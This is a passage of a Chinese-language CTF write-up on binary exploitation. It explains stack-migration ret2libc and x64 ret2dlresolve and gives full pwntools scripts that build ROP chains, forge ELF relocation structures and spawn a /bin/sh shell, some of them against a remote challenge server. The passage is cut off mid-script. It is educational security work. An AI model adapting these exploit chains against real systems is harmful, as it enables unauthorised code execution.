operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token operator\">+</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> asm<span class=\"token punctuation\">(</span>assem<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0x100</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#rbp  rsp data+8</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"stack-migration-revenge\"><a class=\"markdownIt-Anchor\" href=\"#stack-migration-revenge\">#</a> stack migration revenge</h1>\n<p>栈迁移 ret2libc<br>\n 这次跟上周题相比，没有提前泄露栈上地址了。所以选择别处作为栈迁移处。这里依然选择 0x404000~0x405000 处可读写区段。取 <code>data=0x404800</code> 。<img data-src=\"./1697344386529-06337314-7904-47a7-9f87-fa3e1a570cae.png\" alt=\"image.png\"><br>\n 无后门无 syscall，用 ret2libc 的方式解题。所以要先泄露地址，然后执行函数。<br>\n如果用常规方式，rbp 设为 data，ret 设为 leave_ret，那么在迁移完之后，由于没有事先往 data 写入内容，因此程序会终止。因此这里不再利用 leave_ret 作为返回地址，而是取主函数中 read 函数部分作为返回地址。即 <code>read_1=0x4011FA</code> 。<br>\n<img data-src=\"./1697344673071-a792e17e-abf7-4e59-b9de-edd8e12cc58f.png\" alt=\"image.png\"><br>\n 这样当程序第一次返回时，rbp 寄存器设为 data，然后跳到 read_1 处执行 read 函数。而这里的 rsi 值会被设为 rbp+buf，而 buf 的值为 - 0x50，因此此时会往 buf-0x50 处写入数据。此时依旧遵循在 rbp 所指处存放旧 rbp，在 rbp+8 处存放返回地址。<br>\n<img data-src=\"./1697345399899-a73c9b8a-3de9-4316-b2ac-19ebf34c7358.png\" alt=\"image.png\"><br>\n 此时的 “栈” 的地址全部已知。因此直接在 data-0x50 处构建 payload，而返回地址设为 leave_ret，这样返回后会去执行 payload。这一步 payload 用于打印 <code>__libc_start_main</code>  的地址，其最后依旧返回至 read_1，毕竟 rdx 不好控制，就直接用刚刚的方法。其中，payload 开头的旧 rbp 需设为需要写入的地址 + 0x50。这里选择 <code>data+0x100</code> ，那么会往 <code>data+0xb0</code>  写入。<br>\n这时候开始构建 payload，开头的旧 rbp 已经没用了。先构建 <code>system(&quot;/bin/sh&quot;)</code> ，然后在其后放入字符串 <code>&quot;/bin/sh&quot;</code> ，这样是为了防止后面栈增长将字符串覆盖。payload 后面依旧是旧 rbp 指向 <code>data+0xb0</code> ，以及 leave_ret。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',27854)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,'b puts')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>lsm_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rdi_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x04012b3</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rsi_r15 <span class=\"token operator\">=</span> <span class=\"token number\">0x4012b1</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x040101a</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x050</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>leave_ret <span class=\"token operator\">=</span> <span class=\"token number\">0x401227</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token number\">0x404800</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>read_1 <span class=\"token operator\">=</span> <span class=\"token number\">0x4011FF</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'me:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'so funny\\n'</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#rbp 404800 rsp old_rbp</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">#read to 4047b0 </span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>lsm_g<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_p<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>read_1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token operator\">-</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'so funny\\n'</span><span class=\"token punctuation\">)</span>    <span class=\"token comment\">#rbp 4047b0 rsp 404808</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">#rbp 404900 rsp 4047b8</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>lsm_a <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'the true address of __libc_start_main is %#x'</span><span class=\"token operator\">%</span>lsm_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>libcbase <span class=\"token operator\">=</span> lsm_a <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>bs_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token comment\">#'''</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#read to 404710</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'/bin/sh\\0'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token operator\">-</span><span class=\"token number\">0x50</span><span class=\"token operator\">+</span><span class=\"token number\">5</span><span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'/bin/sh\\0'</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> offset</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span>offset<span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>data<span class=\"token operator\">+</span><span class=\"token number\">0x100</span><span class=\"token operator\">-</span><span class=\"token number\">0x50</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>leave_ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token comment\">#rbp 404710 rsp 404768</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#rbp 0 rsp 404718</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./1697345292324-9f473332-0ea0-4ed9-8936-384b29581eab.png\" alt=\"getshell\"></p>\n<h1 id=\"dlresolve-x2\"><a class=\"markdownIt-Anchor\" href=\"#dlresolve-x2\">#</a> *dlresolve x2</h1>\n<p>ret2dlresolve x64</p>\n<blockquote>\n<p>这边有个血的教训，就是利用 patchelf 修改 libc 文件后，elf 文件本身会变动，尤其是.dynamic 段的数据。这时候远程做题的时候不能再用改过的文件提取地址，或者利用其构造 Ret2dlresolvePayload，不然就会像我一样本地周三就打通了，远程失败的原因周六才找到。所以源文件备份后再 patchelf 吧。<br>\n<img data-src=\"./1697347817238-3075fcdc-2ab8-4877-ae0a-fc5d8cf25e1e.png\" alt=\"原文件\"><img data-src=\"./1697347868215-c34f0bbd-cc3c-4f21-94b7-dc072c661273.png\" alt=\"patchelf修改libc后\"></p>\n</blockquote>\n<p>这题没有输出函数，无法通过泄露地址然后进行 ret2libc。所以如题目所说，利用 <code>_dl_runtime_resolve()</code>  函数来调用 <code>system()</code> 。<br>\n检查保护，这题 Relro 为 Partial RELRO 保护，因此.dynamic 段不可修改，漏洞利用方式就是伪造 jmprel, dynsym, dynstr 等数据段。<br>\n<img data-src=\"./1697284934871-6acb3b5d-f294-49fe-8b93-d048a3ad94aa.png\" alt=\"image.png\"><br>\n 存在栈溢出漏洞，在溢出后利用 <code>read()</code>  函数在 0x404000~0x405000 可读写段伪造 Elf64_Rela, Elf64_Sym 等数据块。然后构造 system 函数的参数。最后在放入 reloc_offset，跳转到 plt [0] 处以执行 <code>_dl_runtime_resolve()</code> （其实是先放入 plt [0] 地址再放入 reloc_offset）。<br>\n在伪造数据的同时连同 system 符号和 <code>&quot;/bin/sh\\0&quot;</code>  字符串一并输入进去，用于 <code>_dl_runtime_resolve()</code>  链接函数以及 <code>system()</code>  调用参数。<br>\n<img data-src=\"./1697285151451-f1f10b2e-6a90-4bf1-9bf3-062d7905b7b6.png\" alt=\"image.png\"></p>\n<h2 id=\"利用pwntools\"><a class=\"markdownIt-Anchor\" href=\"#利用pwntools\">#</a> 利用 pwntools</h2>\n<p>这题用 pwntools 直接如下书写。由于没有输出函数，所以两段输入中间用延时区分，或者让第一段输入填充至 100 字符也可（调试时我加入了 <code>input()</code> ，如果没加那么延时分隔不开两段输入）。<br>\n最后执行 <code>system()</code>  时会中止在以下汇编指令。<br>\n<img data-src=\"./1697288473408-0839f093-3617-4809-bc26-d17106d45434.png\" alt=\"image.png\"><br>\n 该命令检查栈有没有对齐，若执行该汇编指令时 rsp 末尾不为 0 会报错。因此在 payload 中加入一个 ret，刚好 8 字节。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>dlresolve <span class=\"token operator\">=</span> Ret2dlresolvePayload<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">,</span> symbol<span class=\"token operator\">=</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">,</span> args<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29599</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#p = process('./pwn')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b read')</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x70</span><span class=\"token operator\">+</span><span class=\"token number\">0x8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>rop <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rop<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> dlresolve<span class=\"token punctuation\">.</span>data_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>rop<span class=\"token punctuation\">.</span>ret2dlresolve<span class=\"token punctuation\">(</span>dlresolve<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>raw_rop <span class=\"token operator\">=</span> rop<span class=\"token punctuation\">.</span>chain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>raw_rop<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>dlresolve<span class=\"token punctuation\">.</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"手写步骤\"><a class=\"markdownIt-Anchor\" href=\"#手写步骤\">#</a> 手写步骤。</h2>\n<p><code>_dl_runtime_resolve()</code>  是靠字符串解析函数的，因此若传入的字符串为 <code>&quot;system&quot;</code> ，那么便能将当前函数解析为 system 函数。而在某个函数第一次调用时（假设是 read 函数），是往栈中 push 了 read 函数所对应的 Elf64_Rela 与 JMPREL 段的<strong>引索</strong>。跳到 plt [0] 后再 push 了 got [0] 的值，也就是 push 了 link_map 的值，随后调用 <code>_dl_runtime_resolve()</code>  进行函数链接。<br>\n因此我们在栈溢出 payload 中需要调用函数的地方放入 plt [0]，随后放入一个引索值，便可解析任何我们想要的函数。<br>\n然后剩下的就是要构造 Elf64_Rela。</p>\n<p>首先选择一段内存用于伪造数据。我这里选择了 0x404500 的位置。<br>\nElf64_Rela 有 3 个成员，其中 r_offset 是该函数 got 表绝对位置。r_info 最左边为函数的 Elf64_Sym 在 symtab 中的<strong>索引</strong>。最低位固定为 7。<br>\n<img data-src=\"./1697287017094-1b28d048-ac63-4adc-993e-19f76268bc84.png\" alt=\"image.png\"><br>\nElf64_Rela 结构体占用 0x18 个字节，所以 fakeRel 的位置与 jmprel 的差要为 0x18 的倍数，这里取 0x404520。在调用 <code>_dl_runtime_resolve()</code>  时需放入该索引，即 <code>reloc_index = (elfRel - jmprel) // 0x18</code> 。r_offset 随便取一个，因为不需要第二次调用，这边取 0x404700。Elf64_64 将要放在 0x404550 的地方，所以 r_info 的值为 <code>((elfSym - symtab) // 0x18) &lt;&lt; 0x20 | 0x7</code> 。</p>\n<p>而对于 Elf64_Sym，其有 6 个成员，其中 st_name 是函数名称字符串的地址占 32 位。第二个参数如果函数为外部函数，则均为 0x12，占 8 位（其实直接设置为 0 应该也可以的）。其他 4 个成员均为 0，分别占 8,16,64,64 位。总共 3 字长，24 字节，所以上一步的引索是地址偏移除以 0x18。<br>\nst_name 取 system 字符串的地址，这边为 0x404590。第二个参数设为 0x12。其他为 0。<br>\n<img data-src=\"./1697287090552-a7de1dff-6ae6-42b1-957d-f49fcc49678c.png\" alt=\"image.png\"><br>\n<img data-src=\"./1697289692026-050491a4-5d1b-4c2d-8b20-7a754744519c.png\" alt=\"image.png\"><br>\n 随后在 0x404590 的地方输入 <code>&quot;system&quot;</code> ，在 0x404580 的地方输入 <code>&quot;/bin/sh\\0&quot;</code> 。然后将这四部分组成一个 payload，用 read 函数输入到 0x404500 的地方。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29599</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p = process('./pwn')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p, 'b read')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>strtab <span class=\"token operator\">=</span> <span class=\"token number\">0x400458</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>symtab <span class=\"token operator\">=</span> <span class=\"token number\">0x4003c8</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>jmprel <span class=\"token operator\">=</span> <span class=\"token number\">0x400518</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token number\">0x404500</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>elfSym <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x50</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>elfRel <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>binsh <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x80</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>elfStr <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x90</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>elfRel <span class=\"token operator\">-</span> jmprel<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token punctuation\">(</span>elfSym <span class=\"token operator\">-</span> symtab<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">0x18</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>reloc_index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>elfRel <span class=\"token operator\">-</span> jmprel<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>r_offset <span class=\"token operator\">=</span> data <span class=\"token operator\">+</span> <span class=\"token number\">0x200</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>r_info <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>elfSym <span class=\"token operator\">-</span> symtab<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">|</span> <span class=\"token number\">0x7</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>main_a <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>plt_init <span class=\"token operator\">=</span> <span class=\"token number\">0x401020</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x70</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x8</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>rop <span class=\"token operator\">=</span> ROP<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>offset<span class=\"token operator\">*</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>rop<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token comment\">#rop.setbuf(1, data+0x500)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token punctuation\">(</span>rop<span class=\"token punctuation\">.</span>rdi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>rop<span class=\"token punctuation\">.</span>raw<span class=\"token 